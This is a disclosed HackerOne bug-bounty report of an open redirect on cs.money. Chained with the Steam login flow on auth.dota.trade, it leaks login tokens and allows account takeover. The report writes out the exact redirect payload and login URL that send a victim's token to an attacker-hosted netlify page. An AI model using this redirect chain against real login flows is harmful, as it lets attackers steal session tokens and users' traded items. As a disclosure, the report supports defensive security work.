---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '905607'
original_report_id: '905607'
title: '[cs.money] Open Redirect Leads to Account Takeover'
weakness: Improper Authentication - Generic
team_handle: cs_money
created_at: '2020-06-22T19:34:01.920Z'
disclosed_at: '2020-09-30T12:31:27.285Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 338
asset_identifier: cs.money
asset_type: URL
max_severity: critical
tags:
- hackerone
- improper-authentication-generic
---

# [cs.money] Open Redirect Leads to Account Takeover

## Metadata

- HackerOne Report ID: 905607
- Weakness: Improper Authentication - Generic
- Program: cs_money
- Disclosed At: 2020-09-30T12:31:27.285Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

I found an open redirect on `https://cs.money` domain, using this payload `https://cs.money///google.com` we can redirect into any domain that we want, you can see the request and response from this image below :

███

## Steps To Reproduce:

The final payload is having an account takeover as the impact, by chaining the openredirect vulnerability with login oauth function, the steps to reproduce is below:

  1. Open this url `https://auth.dota.trade/login?redirectUrl=https://cs.money///loving-turing-29a494.netlify.app%2523&callbackUrl=https://cs.money///loving-turing-29a494.netlify.app%2523` , the login url was gotten from `cs.money` index page button `sign in through steam`:

█████████

  2. Login as usual, the application will redirect you to `https://loving-turing-29a494.netlify.app/#?token=Dlk9sGd8zc6OvxlITijQR&redirectUrl=https://cs.money///loving-turing-29a494.netlify.app#` you will see like this image :
███████
  3.the  attacker already received the victim token on the attacker listener 
███

**If the vulnerability requires hosted server, please, let us know if it is a public or a local one you've tested vulnerability on.**
### Public
My POC Hosted here : loving-turing-29a494.netlify.app

I also create the video POC that show an attacker take over an victim account :
█████

## Impact

Attacker gained full control of the victim account, was able to change the trade-offer link into the attacker link and redeem all the items into attacker account and almost can do anything.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
